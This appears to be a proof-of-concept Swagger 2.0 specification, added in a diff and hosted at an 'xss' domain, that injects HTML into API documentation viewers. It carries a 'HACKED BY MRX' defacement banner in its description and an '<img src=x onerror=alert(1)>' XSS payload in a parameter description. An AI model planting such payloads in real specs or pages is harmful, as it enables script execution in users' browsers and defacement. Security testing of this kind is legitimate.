@@ -1,0 +1,92 @@
+{
+  "swagger": "2.0",
+  "info": {
+    "title": "Classic API Resource Documentation (Safe Demo)",
+    "description": "<h1>HACKED BY MRX</h1>",
+    "version": "production"
+  },
+  "host": "xss.smarpo.com",
+  "basePath": "/JSSResource",
+  "schemes": ["https"],
+  "consumes": ["application/json", "application/xml"],
+  "produces": ["application/json", "application/xml"],
+  "securityDefinitions": {
+    "basicAuth": {
+      "type": "basic"
+    }
+  },
+  "paths": {
+    "/accounts": {
+      "get": {
+        "tags": ["accounts"],
+        "summary": "Finds all accounts",
+        "operationId": "findAccounts",
+        "responses": {
+          "200": {
+            "description": "A list of accounts",
+            "schema": {
+              "type": "array",
+              "items": {
+                "$ref": "#/definitions/Account"
+              }
+            },
+            "examples": {
+              "application/json": [
+                {
+                  "id": 1,
+                  "name": "Alice Johnson",
+                  "email": "alice@example.com"
+                },
+                {
+                  "id": 2,
+                  "name": "Bob Smith",
+                  "email": "bob@example.com"
+                }
+              ]
+            }
+          }
+        }
+      }
+    },
+    "/accounts/groupid/{id}": {
+      "delete": {
+        "tags": ["accounts"],
+        "summary": "Delete account by group id",
+        "operationId": "deleteAccountByGroupId",
+        "parameters": [
+          {
+            "name": "id",
+            "in": "path",
+            "description": "<img src=x onerror=alert(1)>",
+            "required": true,
+            "type": "integer",
+            "format": "int64"
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Deleted (simulated)"
+          },
+          "404": {
+            "description": "Not found"
+          }
+        }
+      }
+    }
+  },
+  "definitions": {
+    "Account": {
+      "type": "object",
+      "properties": {
+        "id": { "type": "integer", "format": "int64" },
+        "name": { "type": "string" },
+        "email": { "type": "string", "format": "email" }
+      },
+      "example": {
+        "id": 1,
+        "name": "Alice Johnson",
+        "email": "alice@example.com"
+      }
+    }
+  }
+}
